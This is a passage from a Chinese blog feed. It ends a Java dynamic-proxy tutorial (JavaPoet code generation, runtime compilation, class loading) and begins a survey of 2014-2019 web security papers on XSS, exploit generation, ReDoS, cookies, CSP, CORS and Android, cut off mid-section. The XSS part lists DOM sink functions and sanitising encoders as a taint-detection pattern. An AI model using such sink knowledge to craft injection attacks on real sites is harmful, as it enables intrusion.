handler;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Proxy0</span><span class="params">(InvocationHandler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler=handler;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod("add");</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod("sell");</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsquare%2Fjavapoet" target="_blank" rel="noopener">JavaPoet</a>实现，代码来自<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">10分钟看懂动态代理设计模式</a>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.javapoet.FieldSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.JavaFile;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.MethodSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.TypeSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(Class subject,InvocationHandler handler)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException,</span></span><br><span class="line"><span class="function">            NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="comment">// 生成proxy.java</span></span><br><span class="line">        TypeSpec.Builder typeSpecBuilder = TypeSpec.classBuilder(<span class="string">"Proxy0"</span>)</span><br><span class="line">                .addSuperinterface(subject);</span><br><span class="line"></span><br><span class="line">        FieldSpec fieldSpec = FieldSpec.builder(InvocationHandler.class, "handler", Modifier.PRIVATE).build();</span><br><span class="line">        typeSpecBuilder.addField(fieldSpec);</span><br><span class="line"></span><br><span class="line">        MethodSpec constructorMethodSpec = MethodSpec.constructorBuilder()</span><br><span class="line">                .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                .addParameter(InvocationHandler.class, "handler")</span><br><span class="line">                .addStatement(<span class="string">"this.handler=handler"</span>)</span><br><span class="line">                .build();</span><br><span class="line">        typeSpecBuilder.addMethod(constructorMethodSpec);</span><br><span class="line"></span><br><span class="line">        Method[] methods = subject.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            MethodSpec methodSpec = MethodSpec.methodBuilder(method.getName())</span><br><span class="line">                    .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                    .addAnnotation(Override<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                    .<span class="title">returns</span>(<span class="title">method</span>.<span class="title">getReturnType</span>())</span></span><br><span class="line">                    .addCode("try &#123;\n")</span><br><span class="line">                    .addStatement(<span class="string">"\t$T method = "</span> + subject.getName() + <span class="string">".class.getMethod(\""</span> + method.getName() + <span class="string">"\")"</span>,</span><br><span class="line">                            Method<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                    // 为了简单起见，这里参数直接写死为空</span></span><br><span class="line">                    .addStatement("\tthis.handler.invoke(this, method, null)")</span><br><span class="line">                    .addCode(<span class="string">"&#125; catch(Exception e) &#123;\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"\te.printStackTrace();\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125;\n"</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            typeSpecBuilder.addMethod(methodSpec);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JavaFile javaFile = JavaFile.builder(<span class="string">"MyImpl"</span>, typeSpecBuilder.build()).build();</span><br><span class="line">        <span class="comment">// 为了看的更清楚，我将源码文件生成到桌面</span></span><br><span class="line">        String srcPath=<span class="string">"./MyProxy"</span>;</span><br><span class="line">        javaFile.writeTo(<span class="keyword">new</span> File(srcPath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 编译源代码</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载进内存并反射创建对象</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译Proxy0的源代码"><a href="#编译Proxy0的源代码" class="headerlink" title="编译Proxy0的源代码"></a>编译Proxy0的源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaCompiler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">(File javaFile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        javax.tools.JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Iterable iterable = fileManager.getJavaFileObjects(javaFile);</span><br><span class="line">        javax.tools.JavaCompiler.CompilationTask task = javaCompiler.getTask(<span class="keyword">null</span>, fileManager, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, iterable);</span><br><span class="line">        task.call();</span><br><span class="line">        fileManager.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Proxy.newProxyInstance()中调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaCompiler.compile(<span class="keyword">new</span> File(srcPath+<span class="string">"/MyImpl/Proxy0.java"</span>));</span><br></pre></td></tr></table></figure><h2 id="加载进内存并创建对象"><a href="#加载进内存并创建对象" class="headerlink" title="加载进内存并创建对象"></a>加载进内存并创建对象</h2><p>使用URLClassLoader加载.class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File filpath=<span class="keyword">new</span> File(<span class="string">""</span>);</span><br><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span>+filpath.getAbsoluteFile()+<span class="string">"\\MyProxy\\"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"MyImpl.Proxy0"</span>);</span><br><span class="line">Constructor constructor = clazz.getConstructor(InvocationHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>); <span class="comment">//不懂 为什么已经是public的方法还需要setAccessible</span></span><br><span class="line">Object obj = constructor.newInstance(handler);</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>可以像系统内置的那样设置动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sell sell = (Sell)Proxy.newProxyInstance(Sell<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">MyInvocationHandler</span>(<span class="title">new</span> <span class="title">SellImpl</span>()))</span>;</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li>10分钟看懂动态代理设计模式，<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">https://juejin.im/post/5a99048a6fb9a028d5668e62</a></li><li>Java动态代理，<a href="https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a" target="_blank" rel="noopener">https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 动态代理 </tag>
            
            <tag> 反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2014-2019Web安全研究方向调查报告</title>
      <link href="/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/"/>
      <url>/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;P）近5年来与Web安全有关的研究，已发现web方向的研究点。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>研究热点聚焦在DOM-XSS上：</p><h2 id="Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19"><a href="#Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19" class="headerlink" title="Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*"></a>Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*</h2><a id="more"></a><p>我们通过污点跟踪技术寻找客户端的XSS问题(感觉跟“Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting”的研究很像)</p><h2 id="Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18"><a href="#Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18" class="headerlink" title="Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*"></a>Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*</h2><h3 id="什么是DOM型XSS："><a href="#什么是DOM型XSS：" class="headerlink" title="什么是DOM型XSS："></a>什么是DOM型XSS：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778397220.png" alt="1546778397220"></p><h3 id="怎么防御："><a href="#怎么防御：" class="headerlink" title="怎么防御："></a>怎么防御：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778565366.png" alt="1546778565366"></p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>我们使用了向V8引擎注入污点技术，具体来说，我们在每个输入的字符串上增加了一个标记，最后看这些标记是否会被document.write()等函数(sink function)带出。在中间过程中我们需要考虑encodeURI等函数，他们应使标记失效。</p><ul><li><p>sink function：</p><ul><li>document.write()</li><li>document.writeln()</li><li>eval()</li><li>设置src属性的setAttribute</li><li>设置href属性的setAttribute</li><li>设置style属性的setAttribute</li><li>设置事件监听属性（onload/onerror/…）的setAttribute</li><li>在setTimeout和setInterval中的string2function</li><li>对document.cookie赋值</li><li>对document.location赋值</li></ul></li><li><p>使标记失效的函数</p><ul><li><p>escape</p><p>escape不编码字符有69个：*，+，-，.，/，@，_，0-9，a-z，A-Z</p></li><li><p>encodeURI</p><p>encodeURI不编码字符有82个：!，#，$，&amp;，’，(，)，*，+，,，-，.，/，:，;，=，?，@，_，~，0-9，a-z，A-Z</p></li><li><p>encodeURIComponent</p><p>encodeURIComponent不编码字符有71个：!， ‘，(，)，*，-，.，_，~，0-9，a-z，A-Z</p></li><li><p>encodeHTML</p><p>需要自己写，将字符串转换成html实体编码</p></li></ul></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>我们与其他静态工具做对比，发现BurpSuite只发现了10%的问题，但是发现了一些其他我们没有发现的问题，而其他工具存在相当高的误报率——95%</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="https://github.com/wrmelicher/ChromiumTaintTracking" target="_blank" rel="noopener">https://github.com/wrmelicher/ChromiumTaintTracking</a></li><li>S. Lekies, B. Stock, and M. Johns, “25 million flows later: large-scale detection of DOM-based XSS,” in Proc. CCS, 2013, pp. 1193–1204.</li></ul><h2 id="Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14"><a href="#Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14" class="headerlink" title="Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14"></a>Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14</h2><p>目前对XSS的防御依赖于字符串检测，本文通过实验揭示了这种方法不能抵御所有的XSS攻击，为此，本文提出了一种基于污点跟踪和感知的XSS过滤器。</p><h2 id="Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14"><a href="#Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14" class="headerlink" title="Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14"></a>Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14</h2><p>Second-Order漏洞是指攻击载荷首先存储在应用服务器上，接着在其他操作时触发的漏洞，本文第一个提出了检测该漏洞的静态代码分析方法，其通过检测连接数据库或对web应用内存的读取和写入操作检测该问题。</p><h1 id="EXP-Generation"><a href="#EXP-Generation" class="headerlink" title="EXP Generation"></a>EXP Generation</h1><h2 id="NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18"><a href="#NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18" class="headerlink" title="NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*"></a>NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*</h2><p>本文构造了一个可拓展的动静结合的web漏洞生成框架，第一步，使用符号执行构建各个模块的行为模型，第二步，构建应用并且使用爬虫获取网站路径，同时使用动态符号执行最大化代码覆盖范围</p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li><a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">https://github.com/aalhuz/navex</a></li></ul><h2 id="Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16"><a href="#Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16" class="headerlink" title="Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*"></a>Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*</h2><p>我们设计了一套EXP生成工具，以提高web注入漏洞的识别能力。为此该工具基于应用的数据流，数据库模型和本机函数等应对web应用程序的多模块，用户输入和多层架构的挑战。</p><h1 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h1><h2 id="Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18"><a href="#Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18" class="headerlink" title="Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18"></a>Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18</h2><p>高度复杂的DoS攻击只需要少量请求就可导致大量资源消耗，为此，我们设计工具Rampart，它通过统计方法和函数级别的程序分析方法，合成并部署过滤器来阻止DoS攻击。</p><h2 id="Tail-Attacks-on-Web-Applications-ccs17"><a href="#Tail-Attacks-on-Web-Applications-ccs17" class="headerlink" title="Tail Attacks on Web Applications, ccs17"></a>Tail Attacks on Web Applications, ccs17</h2><p>本文介绍了一种新型的DDoS攻击，这种攻击利用了网络应用的复杂性和依赖于分布式的特性，使网络响应大于1秒，我们构建了一个模型来检测这一攻击并且提出了一种防御方法。</p><h2 id="Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18"><a href="#Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18" class="headerlink" title="Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18"></a>Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18</h2><p>JavaScript的单线程执行模型使得基于JavaScript的web服务器特别容易受到ReDoS攻击。因此我们对2846个流行的网站进行分析，并且发现了25个之前未知的流行模块漏洞。</p><h2 id="The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18"><a href="#The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18" class="headerlink" title="The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18"></a>The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18</h2><p>正则表达式是导致拒绝服务的新原因，本文研究了ReDoS的三个方面：实际中超线性正则表达式（super-linear regex）的使用率，他们如何预防DoS攻击以及他们如何被修复。本文发现大量的JavaScript和Python依靠正则表达式，同时反模式（anti-patterns）有很少的漏报但是有很多误报，因此这些反模式是必要但不充分的。最后发现对待超线性的表达式，开发者愿意修改它而不是截断输入或是写新的。</p><h2 id="ReScue-crafting-regular-expression-DoS-attacks-ase18"><a href="#ReScue-crafting-regular-expression-DoS-attacks-ase18" class="headerlink" title="ReScue: crafting regular expression DoS attacks, ase18"></a>ReScue: crafting regular expression DoS attacks, ase18</h2><p>本文介绍了一种三阶段灰盒分析技术ReScure，它可以自动生成ReDoS字符串。它通过遗传算法选择种子，接着使用正则表达式算法选择具有最大搜索时间的字符串。</p><p>备注：南大计算机做的研究，好像也在搞移动测试</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18"><a href="#Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18" class="headerlink" title="Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18"></a>Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18</h2><p>cookie容易受到XSS攻击，为此浏览器形成了各种保护机制和政策，本文能通过一个强制执行第三方请求的框架自动化评估这些防御机制的有效性，我们评估了7个浏览器的策略实现和46个浏览器插件，我们发现即使是内置的保护机制也可以被许多新技术绕过。</p><p>思考：Android Browser是不是也有这类问题？</p><h2 id="Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15"><a href="#Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15" class="headerlink" title="Cookies Lack Integrity: Real-World Implications (survey), usenix15"></a>Cookies Lack Integrity: Real-World Implications (survey), usenix15</h2><p>设置了secure标志的cookie会被https加密传输，然而cookie的完整性仍然会受到攻击（没有应用HSTS），本文旨在了解攻击者如何进行一个cookie注入攻击。</p><h2 id="The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16"><a href="#The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16" class="headerlink" title="The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16"></a>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16</h2><p>由于不使用HTTPS，http存在中间人攻击的问题，本文总结了这些问题。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17"><a href="#CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17" class="headerlink" title="CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17"></a>CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17</h2><p>CSP(Content Security Policy)是W3C设计的用来防御内容注入的标准，但是其静态白名单的策略被先前的研究质疑，本文介绍了一种CSP的拓展CCSP，旨在克服静态白名单所来带来的限制同时避免大幅度修改原先的CSP。</p><h2 id="CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16"><a href="#CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16" class="headerlink" title="CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16"></a>CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16</h2><p>CSP是防御XSS攻击的好方式，但是据了解只有0.002%的网站使用了CSP，为此我们设计了工具CSPAutoGen，他为每个网站训练一个模板，再基于模板产生CSP规则。</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18"><a href="#We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18" class="headerlink" title="We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18"></a>We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18</h2><p>开发者提出一些解决方法（比如JSONP）来绕过同源策略，这些方法同时引入了安全问题，CORS是一种更加规范的机制，但是本文通过实证研究发现，CORS的设计和部署受到许多新的安全问题影响：1）CORS放宽了跨域写权限2）开发人员不了解CORS导致错误配置。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19"><a href="#Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19" class="headerlink" title="Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19"></a>Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19</h2><p>本文发现web应用存在的问题仍然会在Android中出现，但是很多移动端浏览器并没有遵从安全准则（HTTP Header）。</p><p>被调查的HTTP Header：</p><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547798650411.png" alt="1547798650411"></p><h2 id="Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19"><a href="#Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19" class="headerlink" title="Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19"></a>Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19</h2><p>本文通过众包方式了解到Android应用程序中开放端口的普及度为15.3%；本文还开发了一种新的静态诊断工具，显示61.8%的开放端口应用程序完全是由嵌入式sdk开发的，20.7%的应用程序使用了不安全的API。我们得出关于端口安全的三个结论：（1）脆弱性分析显示了以Instagram，SamsungGear，Skype，和FacebookSDK为首的5种脆弱的模式；（2）众包显示了224个蜂窝网络和2181个WiFi模式；（3）关于对端口进行DoS攻击的实验性演示</p><h2 id="FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18"><a href="#FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18" class="headerlink" title="FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18"></a>FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18</h2><p>Android访问私人信息是否合法取决于应用是否向用户提供了足够的解释，FlowCog从Android视图中抽取相关的语义，再用NLP方法推断语义与给定流是否相关。</p><h3 id="相关资料-1"><a href="#相关资料-1" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li>https: //github.com/SocietyMaster/FlowCog. </li></ul><h2 id="Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18"><a href="#Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18" class="headerlink" title="Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18"></a>Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18</h2><p>web app通过post进行跨域请求，安卓的混合应用也会使用这些技术，它拓展了postMessage（我们称为“hybird postMessage”，同时也引入了新的问题——origin stripping vulnerability。本文中我们设计了一个工具来检测这问题。</p><h2 id="Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18"><a href="#Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18" class="headerlink" title="Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**"></a>Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**</h2><p>为了节约算力，很多webAPI的验证工作会在移动端进行，但是如果web端不重复验证的话，就会产生不一致的问题，攻击者可以篡改流量来攻击web应用。本文中，我们提出一个工具：WARDroid，它可以自动化的寻找web端和移动端的不一致问题。具体来说，WARDroid静态分析android app中的http通讯模板，接着通过黑盒测试的方法识别不一致性。</p><p><strong>Idea: </strong>可不可以做一个web的？因为web的前后端分离也会造成不一致问题(会议上有人提问)。</p><h3 id="Extract-Backward"><a href="#Extract-Backward" class="headerlink" title="Extract Backward"></a>Extract Backward</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692426847.png" alt="1547692426847"></p><h3 id="HTTP-Request-Templates"><a href="#HTTP-Request-Templates" class="headerlink" title="HTTP Request 